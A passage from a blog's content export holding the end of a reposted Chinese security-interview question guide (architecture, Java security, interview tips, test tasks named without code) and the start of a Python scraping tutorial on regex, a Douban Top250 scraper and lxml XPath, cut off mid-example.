class="headerlink" title="安全管理岗位-安全架构方向"></a>安全管理岗位-安全架构方向</h4><ul><li>传统IDC、云上、混合云架构的安全差异和各自挑战是什么？</li><li>纯云业务如何设计安全架构？</li><li>SDL中的关键点是什么以及如何解决？</li><li>如何防止0day攻击？</li><li>渗透测试、安全研发、安全运营的问题可以挑选的问一些，以确保在各个方向上比较均衡</li><li>对于企业不同时期、不同阶段、不同体量的安全建设的方法、区别以及侧重</li><li>你所做过的安全架构图和所期望的安全架构</li><li>安全与其他团队（运维、研发、测试、GR/PR、内控、高管及三方安全公司）的关系</li><li>安全建设的理念/方法论理解，纵深防御、白名单和黑名单、规则经验和机器学习、自研或者外采</li><li>安全的衡量指标？衡量企业安全建设的水平？</li><li>不同公司间的安全区别或差别是什么？比如腾讯和阿里，百度和京东</li><li>如何制定公司安全建设的三年甚至五年计划</li><li>未来安全行业趋势？</li></ul><h4 id="安全开发岗位-Java方向"><a href="#安全开发岗位-Java方向" class="headerlink" title="安全开发岗位-Java方向"></a>安全开发岗位-Java方向</h4></li><li><p>Java基础</p><ul><li>Java虚拟机区域如何划分？</li><li>HashMap和HashTable、ConcurrentHashMap的区别？</li><li>进程和线程区别，进程间、线程间通信有哪几种方式？</li><li>Java BIO/NIO/AIO是什么？适用哪些场景？</li></ul></li><li><p>业务基础      </p><ul><li>调试工具及异常排查流程？<ul><li><p>如何最大限度避免故障？</p></li><li><p>数据库索引结构，什么情况下应该建唯一索引？</p></li><li><p>数据库分页语句如何写？</p></li></ul></li></ul></li><li><p>业务安全      </p><ul><li>HTTPS交互过程<ul><li><p>OAuth2.0交互过程及其中可能存在的配置不当安全风险</p></li><li><p>对称加密和非对称加密的区别及优缺点</p></li><li><p>获取一个入参url，请求url地址的内容时应注意什么？</p></li><li><p>参数入库前应该如何过滤？</p></li><li><p>过滤器和拦截器原理和应用场景？</p></li><li><p>SESSION ID如何不被Javascript读取？</p></li><li><p>CSRF的Token如何设计？</p></li><li><p>同源策略？如何实现跨域请求？</p></li></ul></li></ul></li></ul><h2 id="面试经验"><a href="#面试经验" class="headerlink" title="面试经验"></a>面试经验</h2><h4 id="企业考察点"><a href="#企业考察点" class="headerlink" title="企业考察点"></a>企业考察点</h4><ul><li>应聘者专业知识及技能，是否能胜任应聘岗位的要求？</li><li>应聘者的学习能力，是否能快速适应和学习？</li><li>应聘者价值观，是否与企业相匹配？</li><li>应聘者认知接受能力，是否能承认错误并改进？</li><li>应聘者创造的欲望，是否有激情？</li></ul><h4 id="提前准备"><a href="#提前准备" class="headerlink" title="提前准备"></a>提前准备</h4><ul><li><p>提前通过搜索引擎、朋友等渠道，尽可能了解所面试公司发展方向、业务模式、主要产品、公司文化、技术氛围、公开的文章、演讲、分享等信息。</p><ul><li>针对面试的岗位需求以及自己工作经历准备一份简单的自我介绍，方便面试官快速准确的了解你的优点和综合素质。要能顺畅的讲出来，同时避免流水账。</li><li> 面试官除了会看简历外，像GitHub、博客等可变内容应当提前整理维护下。</li></ul></li></ul><h4 id="面试结束"><a href="#面试结束" class="headerlink" title="面试结束"></a>面试结束</h4><ul><li>表示对面试官的感谢</li><li>作为面试者，及时记录在面试过程中的不足点，针对不足点进行强化，下一轮面试中改进（往往不足点也会被面试官记录下来并让下一个面试官留意考察）</li></ul><h4 id="甄别团队和同事"><a href="#甄别团队和同事" class="headerlink" title="甄别团队和同事"></a>甄别团队和同事</h4><ul><li>面试官时间管理经验判断，是否会提前预约面试时间、是否会准时参加面试、是否会控制面试过程避免面试者一直讲陷入细节从而超过常见面试时间等</li><li>面试官面试经验判断，根据提问可以了解到其是否有提前了解自己简历中的一些信息、是否问的都是一些很简单的问题、问的问题前后没有逻辑像是模板一样一个个事前准备好的、是否通过预言方式来问问题（你会怎么做？你将怎么做？）等</li><li>面试官基础素质判断，遇到自己回答不好的问题时面试官是否表现出不耐烦等负面情绪、面试官是否会无理打断自己、是否有审讯式的提问（往往通过咄咄逼人的方式提问，试图让面试者出现逻辑矛盾）、是否有质疑式提问（通过质疑、不相信的态度进行沟通，试图让面试者证明一切的真实性）、是否有打压式提问（一定要找到一些你不了解的方向但又问的特别多）、是否有高高在上（往往表现为轻蔑的语气）、是否能问出一些细节（而不只是夸夸其谈）。此处有个例外，资深的管理者往往有可能问一些低级问题，我们需要甄别面试官是真的基础素质不行还是非常资深但希望通过一些低级问题来反向考察面试者</li><li>面试官技术能力判断，这个判断的前提是你是该领域专家，否则很有可能出现的情况是，其实是你没有领会面试官意图而觉得人家不专业的误判。当你对该领域很资深时，你能根据面试官的问题很容易的判断出来其对这个领域的技术水平和认知，甚至一些时候可以通过反向询问（慎用）来支撑你的判断。此外还可以通过了解目标企业的安全水位来判断他们安全技术能力程度</li><li>面试官管理能力，这点非常重要，对于稍微高阶职位来讲，我们多数时候并不期望面试官中的管理者技术很强，更看重的是自己心底愿不愿意跟着他干，跟着他干是不是能有好的发展前途，是不是能有空间获得个人成长</li></ul><h2 id="笔试题目"><a href="#笔试题目" class="headerlink" title="笔试题目"></a>笔试题目</h2><h4 id="渗透测试-Web方向"><a href="#渗透测试-Web方向" class="headerlink" title="渗透测试-Web方向"></a>渗透测试-Web方向</h4><ul><li>给定一个漏洞靶场，在一定时间内找出最多漏洞数</li><li>给定一个匿名访问Redis，请GET SHELL</li><li>给一个项目场景进行安全评估（e.g.与三方厂商进行API交互）</li><li>给定一些包含漏洞（建议SSRF、反序列化、营销活动）的代码，使其发现漏洞或风险、利用漏洞、修复漏洞</li></ul><h4 id="软件开发方向"><a href="#软件开发方向" class="headerlink" title="软件开发方向"></a>软件开发方向</h4><ul><li>读取一个文件第100-200行并发送到一个指定的API接口（着重考察对于各种异常情况的考虑）</li><li>最快的方式获取100万个子域名请求的响应内容并找出其中真实存在的子域名</li></ul><blockquote><p>转载自 <a href="https://github.com/FeeiCN/SecurityInterviewGuide">https://github.com/FeeiCN/SecurityInterviewGuide</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python-spider2</title>
      <link href="/2021/08/20/python-spider2/"/>
      <url>/2021/08/20/python-spider2/</url>
      
        <content type="html"><![CDATA[<p><code>re</code> 模块和Xpath解析HTML，处理防盗链，线程池，<code>aiohttp</code>异步爬取，m3u8抓取一部视频，<code>selenium</code>模块讲解</p><h2 id="re-模块"><a href="#re-模块" class="headerlink" title="re 模块"></a>re 模块</h2><p><code>.*</code> 贪婪匹配</p><p><code>.*?</code> 懒惰匹配</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token string">'玩儿吃鸡游戏，晚上一起玩游戏，干嘛呢？打游戏啊'</span>r1 <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'玩儿.*游戏'</span><span class="token punctuation">,</span> re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>r2 <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'玩儿.*?游戏'</span><span class="token punctuation">,</span> re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>result1 <span class="token operator">=</span> r1<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result1<span class="token punctuation">)</span>result2 <span class="token operator">=</span> r2<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>output</code></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token punctuation">[</span><span class="token string">'玩儿吃鸡游戏，晚上一起玩游戏，干嘛呢？打游戏'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'玩儿吃鸡游戏'</span><span class="token punctuation">]</span>Process finished with <span class="token builtin class-name">exit</span> code <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>贪婪匹配会尽可能多的匹配内容，而懒惰匹配则相反</p></blockquote><h5 id="关于re-S"><a href="#关于re-S" class="headerlink" title="关于re.S"></a>关于<code>re.S</code></h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">a <span class="token operator">=</span> <span class="token triple-quoted-string string">"""sdfkhellolsdlfsdfiooefo:877898989worldafdsf"""</span>b <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'hello(.*?)world'</span><span class="token punctuation">,</span>a<span class="token punctuation">)</span>c <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'hello(.*?)world'</span><span class="token punctuation">,</span>a<span class="token punctuation">,</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'b is '</span> <span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'c is '</span> <span class="token punctuation">,</span> c<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>output</code></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">b is  <span class="token punctuation">[</span><span class="token punctuation">]</span>c is  <span class="token punctuation">[</span><span class="token string">'lsdlfsdfiooefo:\n877898989'</span><span class="token punctuation">]</span>Process finished with <span class="token builtin class-name">exit</span> code <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>如果不使用re.S参数，则只在每一行内进行匹配，如果一行没有，就换下一行重新开始。</p><p>而使用re.S参数以后，正则表达式会将这个字符串作为一个整体，在整体中进行匹配。</p></blockquote><h5 id="以变量形式取出自己想要的内容"><a href="#以变量形式取出自己想要的内容" class="headerlink" title="以变量形式取出自己想要的内容"></a>以变量形式取出自己想要的内容</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token triple-quoted-string string">"""&lt;div class='jay'>&lt;span id='1'>jay&lt;/span>&lt;/div>&lt;div class='jj'>&lt;span id='2'>jj&lt;/span>&lt;/div>&lt;div class='joli'>&lt;span id='3'>joli&lt;/span>&lt;/div>&lt;div class='tom'>&lt;span id='4'>tom&lt;/span>&lt;/div>"""</span>r1 <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r"&lt;div class='.*?'>&lt;span id='\d+'>(?P&lt;name>.*?)&lt;/span>&lt;/div>"</span><span class="token punctuation">,</span> re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>result <span class="token operator">=</span> r1<span class="token punctuation">.</span>finditer<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> result<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>output</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">jayjjjolitomProcess finished <span class="token keyword">with</span> exit code <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="豆瓣Top250提取电影名称，评分等（正则表达式解析HTML）"><a href="#豆瓣Top250提取电影名称，评分等（正则表达式解析HTML）" class="headerlink" title="豆瓣Top250提取电影名称，评分等（正则表达式解析HTML）"></a>豆瓣Top250提取电影名称，评分等（正则表达式解析HTML）</h2><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ol</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>grid_view<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>item<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pic<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>em</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>em</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://movie.douban.com/subject/1292052/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>肖申克的救赎<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://img2.doubanio.com/view/photo/s_ratio_poster/public/p480747492.webp<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>info<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://movie.douban.com/subject/1292052/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>title<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>肖申克的救赎<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>                                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>title<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span>/<span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span>The Shawshank Redemption<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>                                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>other<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span>/<span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span>月黑高飞(港)  /  刺激1995(台)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>playable<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>[可播放]<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                            导演: 弗兰克·德拉邦特 Frank Darabont<span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span><span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span><span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span>主演: 蒂姆·罗宾斯 Tim Robbins /...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>                            1994<span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span>/<span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span>美国<span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span>/<span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span>犯罪 剧情                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>                                                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>star<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>rating5-t<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>                                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>rating_num<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>v:average<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>9.7<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>                                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>v:best<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>10.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>                                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>2428154人评价<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>quote<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>inq<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>希望让人自由。<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>item<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pic<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>em</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>em</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://movie.douban.com/subject/1291546/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>霸王别姬<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://img3.doubanio.com/view/photo/s_ratio_poster/public/p2561716440.webp<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">import</span> requests<span class="token keyword">import</span> timeheaders <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "</span>                  <span class="token string">"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.12 Safari/537.36"</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">requ</span><span class="token punctuation">(</span>para<span class="token punctuation">)</span><span class="token punctuation">:</span>    resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>para<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>    content <span class="token operator">=</span> resp<span class="token punctuation">.</span>text    recompile <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'&lt;img width="100".*?&lt;span class="title">(?P&lt;name>.*?)&lt;/span>'</span>                           <span class="token string">r'.*?&lt;br>(?P&lt;year>.*?)&amp;nbsp.*?property="v:average">(?P&lt;sore>.*?)&lt;/span>'</span><span class="token punctuation">,</span> re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>    res <span class="token operator">=</span> recompile<span class="token punctuation">.</span>finditer<span class="token punctuation">(</span>content<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> res<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"->"</span> <span class="token operator">+</span> i<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token string">"year"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" -- "</span> <span class="token operator">+</span> i<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token string">"sore"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    resp<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> page <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'https://movie.douban.com/top250?start=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>page <span class="token operator">*</span> <span class="token number">25</span><span class="token punctuation">&#125;</span></span><span class="token string">&amp;filter='</span></span>        requ<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>注意每次要延时0.5s，以防请求过快</p></blockquote><h2 id="Xpath解析HTML-抓取猪八戒官网"><a href="#Xpath解析HTML-抓取猪八戒官网" class="headerlink" title="Xpath解析HTML + 抓取猪八戒官网"></a>Xpath解析HTML + 抓取猪八戒官网</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> lxml <span class="token keyword">import</span> etreexml <span class="token operator">=</span> <span class="token triple-quoted-string string">"""&lt;book>    &lt;id>1&lt;/id>    &lt;name>野花遍地香&lt;/name>    &lt;price>1.23&lt;/price>    &lt;author>        &lt;nick id="100">jay&lt;/nick>        &lt;nick id="101">tom&lt;/nick>        &lt;nick class="jolin">jolin&lt;/nick>        &lt;nick class="alice">alice&lt;/nick>        &lt;div>            &lt;nick>aa&lt;/nick>        &lt;/div>        &lt;div>            &lt;nick>bb&lt;/nick>            &lt;div>            &lt;nick>cc&lt;/nick>            &lt;/div>        &lt;/div>        &lt;span>            &lt;nick>ss&lt;/nick>                    &lt;/span>    &lt;/author>&lt;/book>"""</span>tree <span class="token operator">=</span> etree<span class="token punctuation">.</span>XML<span class="token punctuation">(</span>xml<span class="token punctuation">)</span>result <span class="token operator">=</span> tree<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">"/book/name/text()"</span><span class="token punctuation">)</span>result <span class="token operator">=</span> tree<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">"/book/author/nick/text()"</span><span class="token punctuation">)</span>  <span class="token comment"># ['jay', 'tom', 'jolin', 'alice']</span>result <span class="token operator">=</span> tree<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">"/book/author//nick/text()"</span><span class="token punctuation">)</span>  <span class="token comment"># ['jay', 'tom', 'jolin', 'alice', 'aa', 'bb', 'cc']</span>result <span class="token operator">=</span> tree<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">"/book/author/*/nick/text()"</span><span class="token punctuation">)</span>  <span class="token comment"># ['aa', 'bb', 'ss']</span><span class="token comment"># '//'代表所有nick节点</span><span aria-hidden="true" 